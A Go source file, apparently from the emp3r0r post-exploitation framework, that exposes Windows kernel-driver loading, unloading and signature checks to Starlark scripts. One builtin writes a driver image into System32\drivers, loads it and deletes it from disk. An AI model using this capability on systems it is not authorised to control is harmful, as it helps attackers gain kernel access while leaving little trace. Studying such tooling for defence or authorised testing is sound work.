package script

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/driver"
	"go.starlark.net/starlark"
)

// Starlark bindings for core/lib/driver (Windows kernel driver loading).
//
// The driver package ships !windows stubs, so these builtins can be
// registered on every platform; on non-Windows they surface the driver
// package's own "not supported" errors.

func init() {
	RegisterAPI("driver_load", starlarkDriverLoad)
	RegisterAPI("driver_load_bytes", starlarkDriverLoadBytes)
	RegisterAPI("driver_unload", starlarkDriverUnload)
	RegisterAPI("driver_is_loaded", starlarkDriverIsLoaded)
	RegisterAPI("driver_is_signed", starlarkDriverIsSigned)
}

// starlarkDriverLoad installs a driver service and starts it with
// NtLoadDriver. driverPath must be an absolute path to a signed .sys file.
func starlarkDriverLoad(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var driverPath, serviceName string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &driverPath, "name", &serviceName); err != nil {
		return starlark.None, err
	}
	if err := driver.LoadSignedDriver(driverPath, serviceName); err != nil {
		return starlark.None, fmt.Errorf("driver_load %s: %w", serviceName, err)
	}
	return starlark.None, nil
}

// starlarkDriverLoadBytes loads a driver straight from bytes: the image is
// dropped to System32\drivers, loaded, then deleted from disk.
func starlarkDriverLoadBytes(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var dataVal starlark.Value
	var serviceName string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "data", &dataVal, "name", &serviceName); err != nil {
		return starlark.None, err
	}
	data, err := starlarkToBytes(dataVal)
	if err != nil {
		return starlark.None, err
	}
	if err := driver.LoadSignedDriverBytes(data, serviceName); err != nil {
		return starlark.None, fmt.Errorf("driver_load_bytes %s: %w", serviceName, err)
	}
	return starlark.None, nil
}

// starlarkDriverUnload stops the driver with NtUnloadDriver and removes its
// service key.
func starlarkDriverUnload(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var serviceName string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "name", &serviceName); err != nil {
		return starlark.None, err
	}
	if err := driver.UnloadDriver(serviceName); err != nil {
		return starlark.None, fmt.Errorf("driver_unload %s: %w", serviceName, err)
	}
	return starlark.None, nil
}

// starlarkDriverIsLoaded reports whether the driver service key exists.
func starlarkDriverIsLoaded(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var serviceName string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "name", &serviceName); err != nil {
		return starlark.None, err
	}
	return starlark.Bool(driver.IsLoaded(serviceName)), nil
}

// starlarkDriverIsSigned verifies the embedded Authenticode signature of
// path with WinVerifyTrust (offline, cached catalogs only).
func starlarkDriverIsSigned(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}
	signed, err := driver.IsDriverSigned(path)
	if err != nil {
		return starlark.None, fmt.Errorf("driver_is_signed %s: %w", path, err)
	}
	return starlark.Bool(signed), nil
}

// starlarkToBytes converts a Starlark string or bytes value into a []byte.
func starlarkToBytes(v starlark.Value) ([]byte, error) {
	if s, ok := starlark.AsString(v); ok {
		return []byte(s), nil
	}
	if b, ok := v.(starlark.Bytes); ok {
		return []byte(b), nil
	}
	return nil, fmt.Errorf("expected string or bytes, got %s", v.Type())
}
